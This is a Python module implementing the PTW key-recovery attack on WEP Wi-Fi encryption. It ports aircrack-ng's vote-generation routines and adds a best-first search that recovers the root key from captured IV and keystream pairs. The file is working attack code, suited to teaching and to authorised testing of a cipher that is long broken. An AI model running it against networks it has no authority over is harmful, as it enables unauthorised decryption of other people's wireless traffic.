"""PTW (Pyshkin/Tews/Weinmann 2007) WEP key-recovery algorithm.

Provenance, precisely: the vote-generation core below (`_guess_sigma`,
`PTWVoteTable.add_session`) is a direct line-by-line port of aircrack-ng's
`guesskeybytes()` and `PTW_addsession()` (lib/ptw/aircrack-ptw-lib.c),
fetched via a direct raw download (not WebFetch's AI-summarized quote,
which turned out to introduce a real error the first time — see below)
before porting. This is the actual Klein/PTW cryptographic insight:
per session, recover a candidate value of **sigma_i** (the cumulative
sum K[0]+...+K[i] of root-key bytes) via an RC4-KSA-inversion against the
known IV-only-permuted S-box; individual key bytes come from differencing
consecutive sigma values, not from the raw per-session guess.

The key-assembly step (`compute_key`) is NOT a port of aircrack-ng's
`doComputation`/`doRound` tree search — that code was only available to
us as a paraphrased summary, not verbatim source, so per this project's
"verify before asserting" rule it is not claimed to be a faithful port.
Instead this is an independent top-K/beam search over the same vote
table: try the most-voted candidate per key-byte position first, verify
the assembled key against stored session keystreams, and only widen the
search to next-best candidates where verification fails. Same general
idea (votes -> verified candidate), different, honestly-labeled
implementation. Correctness is established empirically in
tests/test_wep_ptw.py via a synthetic known-key round trip, not by
trusting the port.

Constants (verified against aircrack-ng/include/aircrack-ng/ptw/
aircrack-ptw-lib.h): IV = 3 bytes, up to 32 keystream bytes per session,
29 key-hypothesis byte positions (headroom beyond WEP-104's 13 root-key
bytes, since the same vote structure covers longer per-packet keys).
"""

from __future__ import annotations

import heapq
from dataclasses import dataclass, field

from .crypto import rc4_keystream

IV_BYTES = 3
KEY_HYPOTHESIS_BYTES = 29


def _guess_sigma(iv: bytes, keystream: bytes, num_bytes: int = KEY_HYPOTHESIS_BYTES) -> list[int]:
    """Port of guesskeybytes(): one session's per-position guesses of sigma_i.

    Per the reference source's own doc comment, `result` holds guesses of
    **sigma_i = K[0] + K[1] + ... + K[i]** (the *cumulative sum* of root-key
    bytes), not the individual key bytes themselves — confirmed directly
    from a fresh raw fetch of aircrack-ptw-lib.c after an initial port
    treated these as K[i] directly and failed a synthetic round-trip test
    (recovered nothing past position 0, where sigma_0 == K[0] trivially).
    Recovering K[i] from sigma requires K[i] = sigma_i - sigma_{i-1}, done
    in `compute_key` once a full sigma sequence is chosen from the votes.

    `iv` must be 3 bytes; `keystream` the recovered per-IV RC4 output
    (at least IV_BYTES + num_bytes long — callers pad/truncate as needed).
    """
    state = list(range(256))  # rc4initial
    j = 0
    for i in range(IV_BYTES):
        j = (j + state[i] + iv[i]) % 256
        state[i], state[j] = state[j], state[i]

    # Inverse permutation for O(1) lookup — behaviorally identical to the
    # reference's linear `while (tmp != state[ii]) ii++` scan, just faster.
    inverse = [0] * 256
    for idx, val in enumerate(state):
        inverse[val] = idx

    result = []
    jj = IV_BYTES
    s = 0
    for _ in range(num_bytes):
        tmp = (jj - keystream[jj - 1]) % 256
        ii = inverse[tmp]
        s = (s + state[jj]) % 256
        candidate = (ii - j - s) % 256
        result.append(candidate)
        jj += 1
    return result


@dataclass
class Session:
    iv: bytes
    keystream: bytes  # at least IV_BYTES + KEY_HYPOTHESIS_BYTES long, ideally


@dataclass
class PTWVoteTable:
    """Per-position vote counts, built from many (IV, keystream) sessions."""

    num_positions: int = KEY_HYPOTHESIS_BYTES
    votes: list[list[int]] = field(default_factory=lambda: [[0] * 256 for _ in range(KEY_HYPOTHESIS_BYTES)])
    sessions: list[Session] = field(default_factory=list)
    _seen_ivs: set[bytes] = field(default_factory=set)

    def add_session(self, iv: bytes, keystream: bytes, weight: int = 1) -> bool:
        """Add one session's vote; returns False if this IV was already seen (skipped)."""
        if len(iv) != IV_BYTES:
            raise ValueError("IV must be 3 bytes")
        if iv in self._seen_ivs:
            return False
        self._seen_ivs.add(iv)

        padded = keystream + b"\x00" * max(0, IV_BYTES + self.num_positions - len(keystream))
        sigma_guesses = _guess_sigma(iv, padded, self.num_positions)
        for pos, sigma_val in enumerate(sigma_guesses):
            self.votes[pos][sigma_val] += weight
        self.sessions.append(Session(iv=iv, keystream=keystream))
        return True

    def ranked_candidates(self, position: int) -> list[int]:
        """Byte values at `position`, most-voted first."""
        return sorted(range(256), key=lambda b: self.votes[position][b], reverse=True)


def _verify_key(root_key: bytes, sessions: list[Session], check_count: int = 8) -> bool:
    """Test a candidate root key against stored sessions' recorded keystreams."""
    for session in sessions[:check_count]:
        n = len(session.keystream)
        if rc4_keystream(session.iv + root_key, n) != session.keystream:
            return False
    return True


def compute_key(
    table: PTWVoteTable, key_len: int, top_k: int = 8, max_candidates: int = 50_000,
) -> bytes | None:
    """Search the vote table for a verified WEP root key of `key_len` bytes.

    Tries the single most-voted candidate first (cheap common case), then
    widens to a top-K product search across positions, checked in
    most-likely-first order via combined vote rank, verifying each full
    candidate against stored sessions before accepting it.
    """
    if not table.sessions:
        return None

    top_lists = [table.ranked_candidates(pos)[:top_k] for pos in range(key_len)]

    def candidate_from(indices: tuple[int, ...]) -> bytes:
        """Chosen sigma_i values -> actual key bytes via K[i] = sigma_i - sigma_{i-1}."""
        sigmas = [top_lists[pos][idx] for pos, idx in enumerate(indices)]
        key_bytes = []
        prev_sigma = 0
        for sigma in sigmas:
            key_bytes.append((sigma - prev_sigma) % 256)
            prev_sigma = sigma
        return bytes(key_bytes)

    # Best-first search over per-position candidate indices, increasing
    # total rank-sum ("how far down each position's ranked list") — a
    # standard k-smallest-sums heap walk, not a full top_k**key_len product.
    start = (0,) * key_len
    heap: list[tuple[int, tuple[int, ...]]] = [(0, start)]
    visited = {start}
    checked = 0
    while heap and checked < max_candidates:
        _, indices = heapq.heappop(heap)
        checked += 1
        if _verify_key(candidate_from(indices), table.sessions):
            return candidate_from(indices)
        for pos in range(key_len):
            if indices[pos] + 1 < top_k:
                nxt = indices[:pos] + (indices[pos] + 1,) + indices[pos + 1 :]
                if nxt not in visited:
                    visited.add(nxt)
                    heapq.heappush(heap, (sum(nxt), nxt))
    return None
